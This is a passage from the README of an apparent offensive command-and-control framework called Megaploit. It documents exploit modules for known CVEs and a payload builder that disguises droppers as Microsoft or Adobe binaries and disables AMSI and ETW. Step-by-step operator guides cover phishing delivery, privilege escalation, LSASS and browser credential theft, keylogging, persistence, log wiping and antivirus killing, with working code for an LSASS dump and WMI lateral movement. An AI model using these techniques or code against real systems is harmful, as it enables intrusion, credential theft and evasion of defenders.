| `exploits/windows/smb/ms17_010_eternalblue` | CVE-2017-0144 | Windows |
| `exploits/windows/smb/printnightmare_cve2021_1675` | CVE-2021-1675 | Windows |
| `exploits/windows/rdp/bluekeep_cve2019_0708` | CVE-2019-0708 | Windows |
| `exploits/windows/http/exchange_proxylogon_cve2021_26855` | CVE-2021-26855 | Windows |
| `exploits/windows/http/iis_webdav_cve2017_7269` | CVE-2017-7269 | Windows |
| `exploits/windows/smb/smb_login_bruteforce` | — | Windows |
| `exploits/windows/ftp/anon_ftp_deploy` | — | Windows/Linux |
| `exploits/linux/http/log4shell_cve2021_44228` | CVE-2021-44228 | All |
| `exploits/linux/http/apache_struts_cve2017_5638` | CVE-2017-5638 | Linux |
| `exploits/linux/http/heartbleed_cve2014_0160` | CVE-2014-0160 | Linux |
| `exploits/linux/ssh/ssh_login_bruteforce` | — | Linux |
| `exploits/linux/redis/redis_unauth_rce` | CNVD-2015-07557 | Linux |
| `exploits/linux/misc/sudo_baron_samedit_cve2021_3156` | CVE-2021-3156 | Linux |
| `exploits/multi/http/shellshock` | CVE-2014-6271 | All |
| `exploits/multi/http/spring4shell_cve2022_22965` | CVE-2022-22965 | All |
| `exploits/multi/http/wordpress_xmlrpc_bruteforce` | — | All |
| `exploits/multi/http/sql_injection_login_bypass` | — | All |
| `exploits/multi/http/citrix_cve2019_19781` | CVE-2019-19781 | All |
| `exploits/multi/ftp/ftp_vsftpd_backdoor_cve2011_2523` | CVE-2011-2523 | Linux |
| `exploits/multi/handler/reverse_shell_handler` | — | All |

---

## Scanner Modules

```
megaploit [0] » use auxiliary/scanner/tcp_port
megaploit [0] » setopt RHOSTS 10.0.0.0/24
megaploit [0] » setopt PORTS 22,80,443,3306,3389,8080
megaploit [0] » run
```

Available scanners: `tcp_port`, `smb_share_enum`, `http_header_probe`, `ssh_banner_grab`, `dns_resolver`, `icmp_ping_sweep`, `udp_scanner`, `banner_grabber`, `ldap_enum`, `kerberos_asrep_roast`, `kerberos_kerberoast`, `smtp_phishing`

---

## Payload Builder

Build payloads for any platform and delivery method.

```
megaploit [0] » payload <format> [options]
```

| Format | Description |
|---|---|
| `py` | Pure Python source agent |
| `ps1` | PowerShell dropper (AMSI + ETW bypass baked in) |
| `hta` | HTML Application dropper (VBScript) |
| `vba` | VBA macro dropper |
| `sh` | Bash/sh dropper |
| `bat` | Windows batch dropper |
| `exe` | PyInstaller Windows EXE (requires pyinstaller) |
| `elf` | PyInstaller Linux ELF (requires pyinstaller) |
| `go_exe` | Go agent compiled for Windows (requires go) |
| `go_elf` | Go agent compiled for Linux/macOS (requires go) |
| `oneliner_py` | Single Python one-liner (gzip+base64) |
| `oneliner_ps1` | Single PowerShell one-liner with AMSI bypass |
| `py_stealth` | ctypes-only agent (no subprocess/socket at module level) |
| `raw` | Same as py |

**Examples:**

```bash
# Basic PowerShell dropper saved to file
megaploit [0] » payload ps1 --out agent.ps1

# Windows EXE with UPX packing
megaploit [0] » payload exe --out agent.exe --upx

# Windows EXE that looks like a Microsoft binary
megaploit [0] » payload exe --out agent.exe \
    --pe-company "Microsoft Corporation" \
    --pe-product "Windows Defender" \
    --pe-version "4.18.2304.8"

# Python agent with multiple obfuscation layers
megaploit [0] » payload py --encoder comment_spam --encoder varname_rand --out obf.py

# Python agent with sandbox detection prepended
megaploit [0] » payload py --encoder sandbox_detect --encoder etw_patch --out hardened.py

# Go binary for Linux (no Python required on target)
megaploit [0] » payload go_elf --out agent_linux

# PowerShell one-liner with 30-second sleep (sandbox evasion)
megaploit [0] » payload ps1 --sleep 30 --out delayed.ps1

# Stealth Python agent (minimal AV signature)
megaploit [0] » payload py_stealth --out stealth.py

# Print PowerShell one-liner directly to terminal (for pasting)
megaploit [0] » payload oneliner_ps1
```

---

## Post-Exploitation Pipeline

Automatically run a collection of commands on every new session.

```
megaploit [0] » pipeline enable creds     # harvest creds on every new connection
megaploit [0] » pipeline enable recon     # also run recon
megaploit [0] » pipeline status           # show which profiles are active
megaploit [0] » pipeline disable creds    # turn off
```

| Profile | Commands run automatically |
|---|---|
| `basic` | `sysinfo`, `whoami`, `pwd`, `env` |
| `creds` | `hashdump`, `wifi_passwords`, `browser_creds`, `ssh_harvest`, `cred_vault` |
| `recon` | `ps`, `installed_software`, `scheduled_tasks`, `users`, `os_info` |
| `network` | `arp`, `netstat`, `ifconfig` |
| `full` | All of the above |

---

## Pivot Routes

Document your pivot topology and share it with tools/post modules.

```
megaploit [0] » route add 10.10.0.0/16 2      # all traffic to 10.10.x.x goes through session 2
megaploit [0] » route print                    # show routing table
megaploit [0] » route remove 10.10.0.0/16     # remove a route
megaploit [0] » route flush                    # remove all routes
```

---

## Toolbox

Install any GitHub tool and use it directly from the console.

```bash
# Browse 200+ pre-catalogued tools
megaploit [0] » toolbox catalogue

# Install a tool from the catalogue
megaploit [0] » toolbox catalogue install nmap

# Install any GitHub repo directly
megaploit [0] » toolbox install https://github.com/carlospolop/PEASS-ng linpeas

# List your installed tools
megaploit [0] » toolbox list

# Search tools
megaploit [0] » toolbox search "privilege escalation"

# Run a tool against the current session's IP
megaploit session(1) » toolbox_run nmap -sV

# Update a tool
megaploit [0] » toolbox update linpeas

# Remove a tool
megaploit [0] » toolbox remove linpeas
```

---

## Plugin System

Drop a `.toml` file into `plugins/` to add custom commands.

```toml
[[command]]
name    = "portscan"
kind    = "local"
shell   = "nmap -sV -p {arg0:-1-1000} {session_ip}"
timeout = 120
```

```
megaploit [0] » plugins                    # list loaded plugins
megaploit [0] » plugins reload             # hot-reload plugins/ directory
megaploit [0] » plugins info c_remote_shell
megaploit [0] » plugins watcher on         # auto-reload on file changes
```

### C-remote-shell Plugin

Integrates the hardened Windows C agent (SChannel TLS, BCrypt AES-256-GCM):

```
megaploit [0] » set lhost 10.0.0.1
megaploit [0] » set port 4444
megaploit [0] » crs_build              # compile Windows EXE (auto-detects MinGW/MSVC)
megaploit [0] » crs_probe              # run C2 compliance report (46 checks)
megaploit [0] » crs_verbs              # list all wire verbs

# After deploying and connecting a C session:
megaploit session(1) » forceOff        # force power-off via NtSetSystemPowerState ⚠
megaploit session(1) » blueScreen      # trigger BSOD via NtRaiseHardError ⚠
```

---

## Web Dashboard & RPC

```bash
# Start web dashboard (Flask SSE live view)
megaploit [0] » web start
# Open http://127.0.0.1:8080 in your browser

megaploit [0] » web start --port 9090   # custom port
megaploit [0] » web stop
megaploit [0] » web status

# Multi-operator JSON-RPC (team operations)
megaploit [0] » rpc start               # starts on 127.0.0.1:7777
megaploit [0] » rpc start --port 8888
megaploit [0] » rpc operators           # show connected operators
megaploit [0] » rpc stop
```

---

## TLS Encryption

All C2 traffic can be AES-256-GCM encrypted with HMAC-SHA256 authentication. TLS adds an extra transport layer.

```bash
# Auto-generate a self-signed cert on startup
python3 server.py -lh 10.0.0.1 -p 4444 --tls

# Or enable TLS inside the running console
megaploit [0] » tls auto
[+] TLS auto-cert active  →  loot/tls/cert.pem
[*] SHA-256 fingerprint  a3f2b1...

# Show current TLS status
megaploit [0] » tls status

# Force-regenerate the certificate
megaploit [0] » tls regen

# Use your own certificate
megaploit [0] » set cert /path/to/cert.pem
megaploit [0] » set key  /path/to/key.pem
```

The agent payload bakes in TLS support when you run `generate --tls` or `payload ps1 --tls`.

---

## AutoRunScript

Automatically run commands on every new session. Create `~/.megaploit_autorun.json`:

```json
{
  "global":  ["sysinfo", "whoami"],
  "windows": ["os_info", "installed_software", "ps"],
  "linux":   ["os_info", "find_suid", "env", "users"],
  "tags": {
    "dc":          ["hashdump", "users", "scheduled_tasks"],
    "workstation": ["browser_creds", "wifi_passwords", "ps"]
  }
}
```

```
megaploit [0] » autorun show           # display current config
megaploit [0] » autorun reload         # reload from disk
megaploit [0] » autorun save-default   # write starter template
megaploit [0] » autorun test 1         # preview what would run for session 1
```

---

## Credential Store & Reporting

All credentials from `hashdump`, `browser_creds`, `wifi_passwords`, `cred_vault`, `ssh_harvest` are automatically saved to a local SQLite database.

```
megaploit [0] » creds show             # display all stored credentials
megaploit [0] » creds search admin     # search by username/host/type
megaploit [0] » creds export creds.json

# Generate an engagement report
megaploit [0] » report html pentest_report.html
megaploit [0] » report json pentest_report.json
```

---

## Architecture

```
server.py                    ← Operator entry point (run this)
agent.py                     ← Python agent (deploy to target)
secret.key                   ← Shared HMAC secret
megaploit/
  server/
    cli.py                   ← Interactive console
    commands.py              ← 135 session command dispatchers
    meterp_session.py        ← Meterpreter-class console
    listener.py              ← TCP/TLS accept loop
    session.py               ← Session dataclass
  agent/
    handlers.py              ← 90+ victim-side handlers
    meterp.py                ← Advanced post-exploitation handlers
    shell.py                 ← recv → handle → respond loop
    connection.py            ← Connect-back loop
    go_agent/                ← Go agent source
  modules/
    exploits/                ← 20+ exploit modules
    auxiliary/               ← 12+ scanner modules
    post/                    ← Post-exploitation modules
  payload/
    builder.py               ← 14-format payload builder
    encoders.py              ← 10-encoder pipeline
  core/
    protocol.py              ← AES-256-GCM transport + WebSocket
    crypto.py                ← HMAC-SHA256 authentication
    pipeline.py              ← Post-exploitation pipeline
    autorun.py               ← AutoRunScript engine
    jobs.py                  ← Background job manager
  plugins/                   ← TOML plugin system
  toolbox/                   ← 200+ tool installer
  db/                        ← SQLite credential/loot store
  reporting/                 ← HTML/JSON report generator
  web/                       ← Flask dashboard
loot/                        ← All collected data + audit.log
plugins/                     ← TOML plugin files
tools/                       ← Installed toolbox tools
```

---

## Running Tests

```bash
pip install pytest
pytest tests/ -v

# Run a specific test file
pytest tests/test_commands.py -v

# Run with coverage
pip install pytest-cov
pytest tests/ --cov=megaploit --cov-report=html
```

The test suite has 553 passing tests covering all session commands, agent handlers, meterp handlers, exploit modules, the protocol layer, and the module system.

---

## Contributing

See [CONTRIBUTING.md](CONTRIBUTING.md) for the full guide. Quick reference:

1. Fork the repo
2. Create a feature branch: `git checkout -b feature/my-scanner`
3. Write your module in `megaploit/modules/auxiliary/` or `megaploit/modules/exploits/`
4. Add tests in `tests/`
5. Open a pull request

**Full documentation:** [josefifir.github.io/Megaploit](https://josefifir.github.io/Megaploit/)

---

## Professional Pentester Reference

This section assumes you are comfortable with the basics and focuses on operator efficiency, OPSEC, chaining techniques, and real-world engagement workflows.

---

### Engagement Workflow

A structured approach from initial access to reporting:

```
Phase 1 — Setup
  python3 server.py -lh <VPN-IP> -p 443 --tls
  megaploit » tls status                         # verify fingerprint
  megaploit » engagement name "Client Corp — Internal Assessment Q2 2024"
  megaploit » pipeline enable creds              # auto-harvest on every session
  megaploit » pipeline enable recon

Phase 2 — Initial Access  (choose delivery method, see payload matrix below)
  megaploit » payload exe --out dropper.exe --pe-company "Microsoft" \
                           --pe-product "Windows Defender" --upx --tls
  # or: phishing → HTA / PS1 / oneliner_ps1
  # or: exploit module → automated callback

Phase 3 — Per-session immediately after callback
  megaploit » use <N>
  > sandbox_check               # verify not in AV sandbox before acting
  > whoami_priv                 # assess token privileges
  > sysinfo                     # OS version, arch, hostname
  > ps                          # identify security tools running
  > ifconfig                    # spot multi-homed hosts (pivot candidates)

Phase 4 — Privilege Escalation  (see decision tree below)
Phase 5 — Credential Harvesting  (see priority order below)
Phase 6 — Lateral Movement + Pivoting  (see pivoting section below)
Phase 7 — Objectives
Phase 8 — Clean Up + Reporting
  megaploit » self_destruct      # remove traces from each target
  megaploit » report html engagement_report.html
  megaploit » creds export creds_final.json
  megaploit » loot browse
```

---

### OPSEC Checklist

Run this mentally before and after every action:

**Before connecting:**
- [ ] `tls auto` or `--tls` flag active — all traffic encrypted
- [ ] `secret.key` is unique to this engagement (not reused from another)
- [ ] `--allow-ip` set if you know the egress IP of the target network
- [ ] Listener port looks legitimate (443, 80, 8443 blend better than 4444)
- [ ] Agent payload has legitimate-looking PE metadata (`--pe-company`, `--pe-product`)
- [ ] Agent uses `--sleep 30` or `--encoder sandbox_detect` to avoid sandbox detonation

**During operations:**
- [ ] Check `idle_time` before running noisy commands — is someone at the keyboard?
- [ ] Check `active_windows` to see what the user has open
- [ ] `patch_amsi` and `etw_patch` before running PowerShell-based tools
- [ ] `sandbox_check` on first access to a new machine
- [ ] `clear_logs` only after completing all work on that host (do it once, at the end)
- [ ] Use `run_bg` for long-running commands to avoid blocking the channel
- [ ] `timestomp <dropped_file> C:\Windows\System32\notepad.exe` on any dropped files
- [ ] `hide_file <path>` on any agent/tool files left on disk

**Before leaving a session:**
- [ ] Remove tools uploaded during the session (`rm /tmp/linpeas.sh`)
- [ ] If persistence is not required: `self_destruct`
- [ ] If persistence is required: use `persist` with a believable name

---

### Payload Delivery Matrix

Choose the right format for the situation:

| Scenario | Format | Command |
|---|---|---|
| Phishing — user opens attachment | `exe` | `payload exe --out invoice.exe --pe-company "Adobe Inc" --pe-product "Acrobat Reader"` |
| Phishing — macro in Word/Excel | `vba` | `payload vba --out macro.vba --sleep 10` |
| Phishing — HTA file via web link | `hta` | `payload hta --out setup.hta --sleep 15` |
| Initial shell via PowerShell paste | `oneliner_ps1` | `payload oneliner_ps1 --sleep 30` |
| Internal network — Python available | `py_stealth` | `payload py_stealth --encoder etw_patch --out svc.py` |
| Constrained target — no Python | `go_exe` | `payload go_exe --tls --out svchost.exe` |
| Linux target | `go_elf` | `payload go_elf --tls --out .cache` |
| Macro with sandbox delay | `vba` | `payload vba --sleep 60 --encoder sandbox_detect` |
| Staged delivery (proxy/CDN in front) | `stage0` | `stage0 generate --start --out d.py` |
| Firewall allows only HTTP/80 | WebSocket | `listener add 80 --http` then `payload py --tls` |
| Only DNS outbound allowed | DNS | `listener add 53 --dns --zone c2.yourdomain.com` |

**Encoder stacking for high-security targets:**

```bash
# Layer 1: Sandbox detection (kills agent if in VM/sandbox)
# Layer 2: ETW patching (disables event tracing)
# Layer 3: Comment noise (breaks static string signatures)
# Layer 4: Variable randomisation (breaks code structure analysis)
# Layer 5: Gzip+base64 (changes byte distribution, compresses)
megaploit » payload py \
    --encoder sandbox_detect \
    --encoder etw_patch \
    --encoder comment_spam \
    --encoder varname_rand \
    --encoder b64gzip \
    --out final_payload.py
```

---

### Privilege Escalation Decision Tree

```
Check current privileges first:
  > whoami
  > whoami_priv

If already SYSTEM / root → skip to credential harvesting

Windows — Standard user:
  > uac_bypass cmd.exe           # fodhelper registry hijack (no UAC prompt)
  → if successful: now high integrity

Windows — Admin / high integrity:
  > getsystem                    # 3-technique cascade → SYSTEM
  → technique 1: named-pipe impersonation (most reliable)
  → technique 2: SeDebugPrivilege token steal
  → technique 3: unquoted service path
  If getsystem fails:
  > find_suid                    # look for misconfigured services
  > token_steal                  # steal token from SYSTEM process
  > dll_inject 4 C:\Temp\priv.dll  # inject into SYSTEM process

Linux — Standard user:
  > find_suid                    # SUID binaries (pkexec, vim, python3)
  > sudo_sniff                   # capture next sudo password
  > scheduled_tasks              # writable script run as root?
  > services                     # weak service permissions?
  > run_python import subprocess; print(subprocess.check_output(['sudo','-l'],text=True))

Linux — After getsystem / sudo:
  > run_python import os; os.setuid(0)   # confirm root
  > hashdump                             # /etc/shadow
```

---

### Credential Harvesting Priority Order

Run these in order — each one takes seconds and has zero footprint:

```bash
# 1. Current user context (no elevation needed — always run first)
> cred_vault          # Windows Credential Manager: RDP, VPN, generic creds
> wifi_passwords      # saved Wi-Fi keys — often reused as domain passwords
> browser_creds       # Chrome/Edge saved passwords + session cookies
> ssh_harvest         # SSH private keys + known_hosts + shell history

# 2. After UAC bypass / admin
> kiwi credman        # Windows Credential Manager (more complete than cred_vault)
> kiwi tickets        # Kerberos TGT/TGS — pass-the-ticket
> keylog_start        # start background keylogger before escalating

# 3. After SYSTEM
> getsystem
> hashdump            # SAM hive: all local account hashes
> kiwi logonpasswords # LSASS dump: NTLM hashes + SHA1 for all logged-on users
> kiwi sam            # SAM offline dump via RegSaveKey
> kiwi lsa            # LSA secrets: service accounts, domain cached creds

# 4. Domain controller only
> kiwi all            # run every kiwi module
> net_view            # enumerate all domain computers and shares
```

All creds are automatically saved to SQLite. Export later:

```bash
megaploit » creds show
megaploit » creds search <hostname>
megaploit » creds export loot_creds.json
```

---

### Pivoting Techniques Compared

| Technique | Command | Best for | Overhead |
|---|---|---|---|
| **Port forward** | `portfwd 8888 10.10.0.20 3389` | Single-service access (RDP, SSH) | Very low |
| **SOCKS5 proxy** | `socks5` + proxychains | Routing all tools through pivot | Low |
| **SSH dynamic tunnel** | `portfwd 2222 10.10.0.20 22` → `ssh -D 1080 user@target -p 2222` | Full tunnel, stable | Medium |
| **Agent on internal host** | Deploy second agent to internal host via portfwd | Second C2 session on deeper host | None once deployed |
| **Pivot routes** | `route add 10.10.0.0/16 1` | Document topology for post modules | None (metadata only) |

**Pivot chaining example — 3 hops:**

```
Your machine
  └─→ Session 1 (DMZ host, 192.168.1.50)
        └─→ portfwd 2222 10.10.0.5 22
              └─→ SSH to 10.10.0.5 → deploy agent → Session 2
                    └─→ portfwd 3333 172.16.0.10 3389
                          └─→ RDP to internal workstation
```

```bash
# Step 1: from session 1, reach internal SSH host
megaploit session(1) » portfwd 2222 10.10.0.5 22
# Step 2: SSH from your machine through session 1 to internal host
ssh root@192.168.1.50 -p 2222 "python3 -c 'exec(open(\"agent.py\").read())' &"
# Step 3: second agent connects back → Session 2
megaploit » use 2
megaploit session(2) » portfwd 3333 172.16.0.10 3389
# Step 4: RDP to deep internal workstation from your machine
mstsc /v:192.168.1.50:3333
```

---

### Evasion Stack

Layer these techniques in order of increasing noise:

**Layer 0 — Payload generation (before delivery)**
```bash
payload exe --pe-company "Microsoft Corporation" \
            --pe-product "Windows Security Health Service" \
            --pe-version "10.0.22621.2134" \
            --pe-copyright "(C) Microsoft Corporation" \
            --encoder sandbox_detect \
            --encoder etw_patch \
            --sleep 30 \
            --upx \
            --tls \
            --out WindowsSecurityHealth.exe
```

**Layer 1 — On first execution (before doing anything else)**
```bash
> sandbox_check          # confirm not in AV sandbox
> patch_amsi             # disable AMSI for this process
> etw_patch              # disable ETW telemetry for this process
> ps                     # identify EDR/AV processes (CrowdStrike, SentinelOne, etc.)
```

**Layer 2 — Staying hidden**
```bash
> hide_file <agent_path>           # set hidden attribute
> timestomp <agent> <legit_file>   # clone timestamps
> migrate <trusted_pid>            # move into explorer.exe / svchost.exe
> beacon_sleep 300                 # reduce beacon frequency (less noisy)
```

**Layer 3 — Before credential operations**
```bash
> disable_defender                 # if endpoint allows registry writes
> kill <av_pid>                    # last resort — extremely noisy
```

**Layer 4 — Cleaning up**
```bash
> clear_logs                       # wipe Windows event logs / Linux syslog
> rm <any_uploaded_tools>          # delete artefacts
> self_destruct                    # remove agent + persistence + keylog
```

---

### Full Internal Network Engagement Example

End-to-end walkthrough of a typical internal network pentest:

```bash
# ── Setup ────────────────────────────────────────────────────────────────────
python3 server.py -lh 10.50.0.10 -p 443 --tls
megaploit » engagement name "ACME Corp — Internal Pentest 2024"
megaploit » pipeline enable creds
megaploit » pipeline enable recon
megaploit » tls status               # note fingerprint for report

# ── Payload delivery (phishing / USB drop / initial access) ──────────────────
megaploit » payload exe --tls --out SecurityUpdate.exe \
    --pe-company "Microsoft Corporation" \
    --pe-product "Windows Defender" \
    --pe-version "4.18.2304.8" \
    --encoder sandbox_detect --sleep 30 --upx

# ── Session arrives — immediate triage ───────────────────────────────────────
megaploit » use 1
> sandbox_check              # verify not sandboxed
> patch_amsi                 # disable AMSI
> etw_patch                  # disable ETW
> whoami_priv                # assess token privileges
> ps | grep -i "crowd\|sentinel\|carbon\|defender\|cylance"  # find EDR

# ── Privilege escalation ─────────────────────────────────────────────────────
> uac_bypass cmd.exe         # bypass UAC if standard user
> getsystem                  # escalate to SYSTEM

# ── Credential harvest ───────────────────────────────────────────────────────
> kiwi logonpasswords        # NTLM hashes from LSASS (needs SYSTEM)
> kiwi sam                   # local account hashes
> kiwi lsa                   # LSA secrets: service accounts
> kiwi tickets               # Kerberos tickets
> wifi_passwords             # saved Wi-Fi keys
> browser_creds              # saved browser passwords
> cred_vault                 # Windows Credential Manager

# ── Persistence ──────────────────────────────────────────────────────────────
> persist WindowsDefenderSvc SecurityUpdate.exe
> kiwi wdigest               # enable cleartext caching for next logon

# ── Network discovery ─────────────────────────────────────────────────────────
> ifconfig                   # spot dual-homed interfaces
> arp_scan 10.10.0.0/24      # find live hosts
> net_view ACME.LOCAL        # enumerate domain
> port_scan 10.10.0.5 22,80,135,139,443,445,1433,3389

# ── Lateral movement ─────────────────────────────────────────────────────────
> portfwd 4450 10.10.0.5 445         # reach DC's SMB
megaploit » use exploits/windows/smb/smb_login_bruteforce
megaploit » setopt RHOSTS 10.10.0.5
megaploit » setopt USERNAME administrator
megaploit » setopt PASSWORDS loot_creds.json  # use harvested creds
megaploit » run

# ── Domain controller ─────────────────────────────────────────────────────────
megaploit » use 2                    # new session on DC
> getsystem
> kiwi all                           # full DC credential dump
> net_view ACME.LOCAL                # full domain map
> hashdump                           # shadow/SAM

# ── Cleanup ───────────────────────────────────────────────────────────────────
megaploit » sessions -c "clear_logs"  # clear logs on all sessions
megaploit session(1) » self_destruct
megaploit session(2) » self_destruct

# ── Reporting ─────────────────────────────────────────────────────────────────
megaploit » creds export final_creds.json
megaploit » report html ACME_Internal_Pentest_2024.html
megaploit » loot browse
```

---

### External Assessment Example

Attacking from the internet with no insider access:

```bash
# ── Reconnaissance ────────────────────────────────────────────────────────────
# Use scanner modules for service discovery
megaploit » use auxiliary/scanner/tcp_port
megaploit » setopt RHOSTS acme-corp.com
megaploit » setopt PORTS 21,22,25,80,443,1433,3389,8080,8443
megaploit » run

# Check for known CVEs on discovered services
megaploit » use auxiliary/scanner/http_header_probe
megaploit » setopt RHOSTS acme-corp.com
megaploit » run

# ── Web application attacks ───────────────────────────────────────────────────
megaploit » use exploits/multi/http/sql_injection_login_bypass
megaploit » setopt RHOSTS acme-corp.com
megaploit » setopt TARGETURI /admin/login
megaploit » run

megaploit » use exploits/multi/http/wordpress_xmlrpc_bruteforce
megaploit » setopt RHOSTS acme-corp.com
megaploit » setopt USERNAME admin
megaploit » setopt PASSWORDS /wordlists/rockyou.txt
megaploit » run

# ── CVE-based exploitation ────────────────────────────────────────────────────
megaploit » use exploits/multi/http/log4shell_cve2021_44228
megaploit » setopt RHOSTS acme-corp.com
megaploit » setopt RPORT 8443
megaploit » setopt LHOST <your-vps-ip>
megaploit » check
megaploit » run

# ── After initial foothold ────────────────────────────────────────────────────
megaploit » use 1
> sysinfo
> ifconfig          # where are we? cloud? on-prem?
> ps                # what's running?
> env               # cloud metadata, API keys, secrets
> find_files / "*.env"
> search / "AWS_ACCESS_KEY\|AZURE_CLIENT\|api_key"
> cat /app/.env     # web app database credentials
```

---

### Active Directory Attack Chain

Systematic approach when you land on a Windows domain host:

```bash
# Step 1 — Establish context
> whoami              # are we on a domain?
> net_view            # enumerate domain — finds DCs
> dns_query _ldap._tcp.ACME.LOCAL   # find all DCs

# Step 2 — Kerberos attacks (from scanner modules, no session needed)
megaploit » use auxiliary/scanner/kerberos_asrep_roast
megaploit » setopt RHOSTS <DC-IP>
megaploit » setopt DOMAIN ACME.LOCAL
megaploit » run
# → Crack AS-REP hashes offline: hashcat -m 18200 hashes.txt rockyou.txt

megaploit » use auxiliary/scanner/kerberos_kerberoast
megaploit » setopt RHOSTS <DC-IP>
megaploit » run
# → Crack TGS hashes: hashcat -m 13100 tgs.txt rockyou.txt

# Step 3 — With cracked domain creds: lateral movement
megaploit session(1) » run_as ACME\svc_sql Password1! "net user /domain"
megaploit session(1) » run_as ACME\svc_sql Password1! "net group 'Domain Admins' /domain"

# Step 4 — Pass-the-hash (with NTLM hash from kiwi)
megaploit » use exploits/windows/smb/smb_login_bruteforce
megaploit » setopt USERNAME administrator
megaploit » setopt NTLM_HASH <hash-from-kiwi-logonpasswords>
megaploit » run

# Step 5 — On domain controller
> kiwi lsa           # LSA secrets: DSRM password, trust account hashes
> kiwi all           # complete domain credential dump
> net_view ACME.LOCAL  # full forest/trust enumeration
> reg query HKLM\SYSTEM\CurrentControlSet\Services  # check service account passwords
```

---

### Automation & Scripting

#### Resource scripts

Run a batch of commands non-interactively:

```bash
# Create a resource script:
cat > initial_recon.rc << 'EOF'
sandbox_check
patch_amsi
etw_patch
whoami_priv
sysinfo
ps
ifconfig
arp
EOF

# Run it:
megaploit » resource initial_recon.rc
```

#### AutoRunScript for automated collection

The most powerful automation: configure once, runs on every new session automatically.

```json
{
  "global":  ["sandbox_check", "patch_amsi", "etw_patch", "whoami_priv", "sysinfo", "screenshot"],
  "windows": ["installed_software", "startup_items", "scheduled_tasks", "active_windows"],
  "linux":   ["find_suid", "services", "users", "env"],
  "tags": {
    "dc":     ["kiwi all", "net_view", "hashdump", "scheduled_tasks"],
    "web":    ["find_files /var/www password", "find_files /etc nginx.conf", "env"],
    "sql":    ["find_files / *.mdf", "installed_software", "services"],
    "laptop": ["browser_creds all", "wifi_passwords", "keylog_start", "screenshot"]
  }
}
```

Save to `~/.megaploit_autorun.json`, then:

```bash
megaploit » autorun reload
megaploit » autorun test 1    # preview what fires for session 1
```

#### Session broadcasting

Run a command against every connected host at once:

```bash
megaploit » sessions -c whoami           # C2 command to all sessions
megaploit » sessions -c patch_amsi       # patch AMSI on all sessions
megaploit » sessions -c "keylog_start"   # start keylogger everywhere
megaploit » broadcast id                 # raw shell command to all
```

#### Background jobs for long-running scans

```bash
megaploit session(1) » run_bg find / -name "*.pem" 2>/dev/null
# job ID returned: job_abc123

# Do other work...

megaploit session(1) » job_result job_abc123
```

---

### Extending Megaploit

#### Writing a custom post module

The fastest way to add a repeatable technique:

```python
# megaploit/modules/post/windows/gather/dump_lsass.py
from megaploit.modules.base import AgentModule, ModuleType

class DumpLsass(AgentModule):
    name        = "post/windows/gather/dump_lsass"
    description = "Create a full LSASS minidump via comsvcs.dll (no kiwi required)"
    module_type = ModuleType.POST

    def run(self, session=None):
        self.validate()
        sess = session or self.session
        # Execute via LOLBin — comsvcs.dll MiniDump
        pid_out = self._send("shell Get-Process lsass | Select-Object -ExpandProperty Id", sess)
        pid = pid_out.strip()
        self._send(
            f'run_psh "rundll32 C:\\\\Windows\\\\System32\\\\comsvcs.dll, MiniDump {pid} C:\\\\Temp\\\\lsass.dmp full"',
            sess
        )
        self._send("download C:\\Temp\\lsass.dmp", sess)
        self._ok("LSASS dump saved to loot", pid=pid)
        return self.results

MODULE = DumpLsass
```

Run it:

```bash
megaploit session(1) » run post/windows/gather/dump_lsass
```

#### Writing a custom extension (injected at runtime)

No restart, no redeployment — loaded into the live agent:

```python
# /tmp/lateral.py — upload and load during engagement
import subprocess, base64

def _wmi_exec(conn, args):
    """WMI lateral movement: wmi_exec <target> <user> <pass> <cmd>"""
    if len(args) < 4:
        return "Usage: wmi_exec <target> <user> <pass> <cmd>"
    target, user, pwd, cmd = args[0], args[1], args[2], " ".join(args[3:])
    ps = (
        f'$c=New-Object System.Management.ManagementClass(\\\\.\\\\{target}\\root\\cimv2:Win32_Process);'
        f'$c.Create("{cmd}")'
    )
    out = subprocess.check_output(
        ["powershell", "-ep", "bypass", "-c", ps], text=True, stderr=subprocess.STDOUT
    )
    return out

HANDLERS = {"wmi_exec": _wmi_exec}
```

```bash
megaploit session(1) » load_ext /tmp/lateral.py
[+] Extension 'lateral' loaded — verbs: wmi_exec

megaploit session(1) » wmi_exec 10.10.0.20 ACME\admin P@ssw0rd whoami
```

#### Custom TOML plugin for reusable operator shortcuts

```toml
# plugins/red_team.toml
name = "red_team"
version = "1.0"

[[command]]
name    = "quick_recon"
kind    = "session"
help    = "Rapid triage: patch AMSI, get sysinfo, screenshot, list processes"
shell   = "patch_amsi && etw_patch && sysinfo && screenshot && ps"

[[command]]
name    = "nmap_pivot"
kind    = "local"
help    = "nmap_pivot <cidr> — scan CIDR through active session"
shell   = "proxychains nmap -sT -p 22,80,135,139,443,445,3389,8080 {arg0}"
timeout = 300
```

Drop the file in `plugins/`, then:

```bash
megaploit » plugins reload
megaploit session(1) » quick_recon
megaploit » nmap_pivot 10.10.0.0/24
```
